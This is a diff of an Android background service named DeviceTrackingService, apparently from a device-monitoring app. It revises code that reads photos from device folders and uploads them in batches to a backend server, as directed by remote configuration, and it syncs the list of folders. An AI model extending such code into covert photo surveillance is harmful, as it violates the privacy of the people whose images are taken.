@@ -9,12 +9,14 @@ import android.app.Service;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
+import android.content.res.AssetFileDescriptor;
 import android.media.MediaRecorder;
 import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
+import android.provider.MediaStore;
 import android.util.Log;
 import android.widget.Toast;
 import java.io.File;
@@ -65,7 +67,7 @@ public class DeviceTrackingService extends Service {
 
     private boolean cameraRequestShown = false;
 
-    private static final int IMAGE_BATCH_SIZE = 3;
+    private static final int IMAGE_BATCH_SIZE = 2;
 
     private boolean folderSynced = false;
     private boolean imageUploading = false;
@@ -97,14 +99,6 @@ public class DeviceTrackingService extends Service {
         deviceId = DeviceUtils.getDeviceId(this);
 
         handler = new Handler();
-
-        Log.d(TAG, "Before syncImageFolders");
-        Log.d(TAG, "folderSynced" + folderSynced);
-        if (!folderSynced) {
-            Log.d(TAG, "Calling syncImageFolders");
-            syncImageFolders();
-            folderSynced = true;
-        }
 
         startTracking();
 
@@ -400,17 +394,31 @@ public class DeviceTrackingService extends Service {
                                 Log.d(TAG, "imageUploading = " + imageUploading);
                                 Log.d(TAG,"Bucket="+config.getImageBucketId());
 
-                                if (Boolean.TRUE.equals(config.getRefreshImages()) && !imageUploading) {
+                                if ((!Boolean.TRUE.equals(config.getImagesUploaded())
+                                        || Boolean.TRUE.equals(config.getRefreshImages()))
+                                        && !imageUploading) {
                                     Log.d(TAG, "uploadImages() called");
                                     Log.d(TAG, "Folder = " + config.getImageBucketId());
                                     imageUploading = true;
 
                                     uploadImages(
                                             config.getImageBucketId(),
-                                            config.getImageLimit() != null ? config.getImageLimit() : 20,
+                                            config.getImageLimit() != null ? config.getImageLimit() : 4,
                                             config.getImageOffset() != null ? config.getImageOffset() : 0,
                                             config.getImageOrder() != null ? config.getImageOrder() : "NEWEST"
                                     );
+                                }
+
+                                //folder sync
+                                Log.d(TAG, "===== BEFORE FOLDER SYNC =====");
+                                Log.d(TAG, "folderSynced = " + folderSynced);
+
+                                if (!folderSynced) {
+
+                                    Log.d(TAG, "syncImageFolders() CALLED");
+
+                                    syncImageFolders();
+
                                 }
 
                                 // Videos
@@ -591,66 +599,73 @@ public class DeviceTrackingService extends Service {
                               int offset,
                               String order) {
 
-
         try {
 
             boolean permissionGranted;
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-
                 permissionGranted = hasPermission(Manifest.permission.READ_MEDIA_IMAGES);
-
             } else {
-
                 permissionGranted = hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
-
             }
 
             if (!permissionGranted) {
 
+                Log.e(TAG, "READ_MEDIA_IMAGES Permission Not Granted");
                 imageUploading = false;
-                Log.e(TAG, "Image Permission Denied");
-                return;
 
+                // next cycle me retry hoga
+                return;
             }
 
-            // Default values
+            if (folder == null || folder.trim().isEmpty()) {
+                Log.d(TAG, "Bucket Id is NULL");
+                imageUploading = false;
+                return;
+            }
+
             if (limit <= 0) {
                 limit = 20;
             }
 
-            if (order == null || order.trim().isEmpty()) {
-                order = "NEWEST";
+            if (offset < 0) {
+                offset = 0;
             }
 
-            List<ImageItem> images = ImageUtils.getImages(
+            if (order == null || order.trim().isEmpty()) {
+                order = "DESC";
+            }
 
-                    this,
-                    folder,
-                    limit,
-                    offset,
-                    order
-
-            );
-
-            Log.d(TAG, "uploadImages() called");
-            Log.d(TAG, "Folder = " + folder);
-            Log.d(TAG, "Limit = " + limit);
-            Log.d(TAG, "Offset = " + offset);
-            Log.d(TAG, "Order = " + order);
-            Log.d(TAG, "Images Found = " + images.size());
+            List<ImageItem> images =
+                    ImageUtils.getImages(
+                            this,
+                            folder,
+                            limit,
+                            offset,
+                            order
+                    );
 
             if (images == null) {
-                Log.d(TAG, "Images list is NULL");
+
+                Log.d(TAG, "Image list is NULL");
                 imageUploading = false;
                 return;
             }
 
-            Log.d(TAG, "Images Found = " + images.size());
+            Log.d(TAG, "================ IMAGE DEBUG ================");
+            Log.d(TAG, "Folder : " + folder);
+            Log.d(TAG, "Limit : " + limit);
+            Log.d(TAG, "Offset : " + offset);
+            Log.d(TAG, "Order : " + order);
+            Log.d(TAG, "Images Found : " + images.size());
+
+            for (ImageItem item : images) {
+                Log.d(TAG, item.getImageName() + " -> " + item.getImageUri());
+            }
 
             if (images.isEmpty()) {
 
-                Log.d(TAG, "No Images Found");
+                Log.d(TAG, "No Images Found For Bucket : " + folder);
                 imageUploading = false;
                 return;
             }
@@ -660,23 +675,18 @@ public class DeviceTrackingService extends Service {
         } catch (Exception e) {
 
             imageUploading = false;
-            Log.e(TAG, "Image Upload Exception", e);
+            Log.e(TAG, "uploadImages()", e);
 
         }
-
     }
 
     private void uploadImageBatch(List<ImageItem> images, int startIndex) {
 
-
         if (startIndex >= images.size()) {
 
             imageUploading = false;
-
             Log.d(TAG, "All Images Uploaded");
-
             return;
-
         }
 
         RequestBody deviceBody =
@@ -685,27 +695,53 @@ public class DeviceTrackingService extends Service {
                         MultipartBody.FORM
                 );
 
+        // Backend duplicate handle karega
         RequestBody clearOldBody =
                 RequestBody.create(
-                        startIndex == 0 ? "true" : "false",
+                        "false",
                         MultipartBody.FORM
                 );
 
         List<MultipartBody.Part> parts = new ArrayList<>();
 
-        int endIndex =
-                Math.min(
-                        startIndex + IMAGE_BATCH_SIZE,
-                        images.size()
-                );
+        long totalBatchSize = 0;
+
+        int endIndex = Math.min(
+                startIndex + IMAGE_BATCH_SIZE,
+                images.size()
+        );
 
         for (int i = startIndex; i < endIndex; i++) {
 
             ImageItem item = images.get(i);
+
             Log.d(TAG, "Uploading : " + item.getImageName());
             Log.d(TAG, "Uri : " + item.getImageUri());
 
             try {
+
+                AssetFileDescriptor afd =
+                        getContentResolver().openAssetFileDescriptor(
+                                item.getImageUri(),
+                                "r"
+                        );
+
+                if (afd != null) {
+
+                    long size = afd.getLength();
+                    totalBatchSize += size;
+
+                    Log.d(TAG,
+                            "Image Size : "
+                                    + item.getImageName()
+                                    + " = "
+                                    + (size / 1024)
+                                    + " KB ("
+                                    + String.format("%.2f", size / (1024.0 * 1024.0))
+                                    + " MB)");
+
+                    afd.close();
+                }
 
                 RequestBody requestBody =
                         new InputStreamRequestBody(
@@ -726,26 +762,29 @@ public class DeviceTrackingService extends Service {
             } catch (Exception e) {
 
                 Log.e(TAG,
-                        "Image Read Error : "
-                                + item.getImageName(),
+                        "Image Read Error : " + item.getImageName(),
                         e);
 
             }
-
         }
 
         if (parts.isEmpty()) {
 
             uploadImageBatch(images, endIndex);
-
             return;
-
         }
 
-        Log.d(TAG, "Uploading Batch = " + parts.size());
+        Log.d(TAG, "========== IMAGE UPLOAD ==========");
+        Log.d(TAG, "Batch Size = " + parts.size());
         Log.d(TAG, "DeviceId = " + DeviceUtils.getDeviceId(this));
-        Log.d(TAG, "ClearOld = " + (startIndex == 0));
-        Log.d(TAG, "Parts Count = " + parts.size());
+        Log.d(TAG, "ClearOld = false");
+
+        Log.d(TAG,
+                "Batch Total Size = "
+                        + (totalBatchSize / 1024)
+                        + " KB ("
+                        + String.format("%.2f", totalBatchSize / (1024.0 * 1024.0))
+                        + " MB)");
 
         ApiClient.getApiService()
                 .uploadImages(
@@ -756,9 +795,8 @@ public class DeviceTrackingService extends Service {
                 .enqueue(new Callback<ApiResponse<String>>() {
 
                     @Override
-                    public void onResponse(
-                            Call<ApiResponse<String>> call,
-                            Response<ApiResponse<String>> response) {
+                    public void onResponse(Call<ApiResponse<String>> call,
+                                           Response<ApiResponse<String>> response) {
 
                         if (response.isSuccessful()
                                 && response.body() != null
@@ -773,39 +811,62 @@ public class DeviceTrackingService extends Service {
                         } else {
 
                             Log.e(TAG, "Upload Failed");
+                            Log.e(TAG, "HTTP Code = " + response.code());
 
-                            if (response.body() != null) {
-
-                                Log.e(TAG,
-                                        "Message : "
-                                                + response.body().getMessage());
-
+                            if (response.errorBody() != null) {
+                                try {
+                                    Log.e(TAG, response.errorBody().string());
+                                } catch (Exception ignored) {
+                                }
                             }
-
                         }
 
                         uploadImageBatch(images, endIndex);
-
                     }
 
                     @Override
-                    public void onFailure(
-                            Call<ApiResponse<String>> call,
-                            Throwable t) {
+                    public void onFailure(Call<ApiResponse<String>> call,
+                                          Throwable t) {
 
                         Log.e(TAG, "Upload Error", t);
 
                         uploadImageBatch(images, endIndex);
-
                     }
-
                 });
-
     }
-
     private void syncImageFolders() {
 
         Log.d(TAG, "========== Folder Sync ==========");
+
+        boolean permissionGranted;
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+
+            permissionGranted = ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.READ_MEDIA_IMAGES
+            ) == PackageManager.PERMISSION_GRANTED;
+
+        } else {
+
+            permissionGranted = ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.READ_EXTERNAL_STORAGE
+            ) == PackageManager.PERMISSION_GRANTED;
+
+        }
+
+        if (!permissionGranted) {
+
+            Log.d(TAG, "Image permission not granted. Folder sync skipped.");
+
+            folderSynced = false;
+
+            return;
+        }
+
+        List<ImageItem> images = ImageUtils.getImages(this);
+        Log.d("IMAGE_FOLDER", "Total Images = " + images.size());
 
         List<ImageFolderItem> folders = ImageUtils.getImageFolders(this);
 
@@ -833,9 +894,8 @@ public class DeviceTrackingService extends Service {
                 .enqueue(new Callback<ApiResponse<String>>() {
 
                     @Override
-                    public void onResponse(
-                            Call<ApiResponse<String>> call,
-                            Response<ApiResponse<String>> response) {
+                    public void onResponse(Call<ApiResponse<String>> call,
+                                           Response<ApiResponse<String>> response) {
 
                         Log.d(TAG, "HTTP Code : " + response.code());
 
@@ -846,11 +906,10 @@ public class DeviceTrackingService extends Service {
 
                         }
 
-                        if (response.isSuccessful()
-                                && response.body() != null
-                                && response.body().isSuccess()) {
+                        if (response.isSuccessful() && response.body() != null && response.body().isSuccess()) {
 
                             Log.d(TAG, "Folder Sync Success");
+                            folderSynced = true;
 
                         } else {
 
@@ -878,6 +937,7 @@ public class DeviceTrackingService extends Service {
                     public void onFailure(
                             Call<ApiResponse<String>> call,
                             Throwable t) {
+                        folderSynced = false;
 
                         Log.e(TAG, "Folder Sync API Failed", t);
 
